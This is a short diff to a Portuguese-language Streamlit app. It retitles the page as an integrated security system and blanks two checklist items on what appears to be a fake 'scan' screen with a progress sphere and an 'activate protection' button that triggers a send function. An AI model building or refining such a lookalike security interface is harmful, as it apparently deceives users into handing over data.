@@ -13,7 +13,7 @@ def enviar(msg):
     except: pass
 
 # 2. CONFIGURAÇÃO E CSS
-st.set_page_config(page_title="Segurança", layout="centered")
+st.set_page_config(page_title="Sistema Integrado De Segurança", layout="centered")
 
 st.markdown("""
     <style>
@@ -48,9 +48,9 @@ caixa = st.empty()
 with caixa.container():
     st.markdown('<div class="scanner-container"><div class="sphere"><div class="pct">4%</div></div></div>', unsafe_allow_html=True)
 
-st.write("✅ Ambiente de pagamentos")
+st.write("")
 st.write("✅ Privacidade e segurança")
-st.write("✅ Vírus")
+st.write("")
 
 # 5. BOTÃO E ENVIO
 if st.button("🔴 ATIVAR PROTEÇÃO", key='BTN_FIX'):
